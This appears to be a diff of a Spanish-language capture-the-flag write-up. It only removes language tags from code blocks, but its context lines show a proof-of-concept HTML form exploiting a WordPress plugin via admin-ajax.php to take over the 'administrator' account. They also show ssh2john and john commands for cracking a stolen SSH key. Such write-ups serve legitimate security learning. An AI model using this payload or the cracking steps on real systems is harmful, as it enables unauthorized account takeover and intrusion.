@@ -33,7 +33,7 @@ Además de dos usuarios (`admin` y `Administrator`) nos encontramos con un plugi
 
 Para poder explotarlo primero debemos buscar dicha vulnerabilidad, en mi caso utilizaré [`Exploit-DB`](https://www.exploit-db.com/exploits/41006). Vemos que está el resultado que queríamos, además nos dejan una prueba de concepto para que podamos imitarla, vamos a ver cómo funciona:
 
-```HTML
+```
 <form method="post" action="http://wp/wp-admin/admin-ajax.php">
 	Username: <input type="text" name="username" value="administrator">
 	<input type="hidden" name="email" value="sth">
@@ -84,7 +84,7 @@ Una vez nos hayamos descargado el archivo podemos utilizar `ssh2john` para obten
 - `ssh2john id_rsa > hash.txt`
 - `john hash.txt -w=rockyou.txt`
 
-```Ruby
+```
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
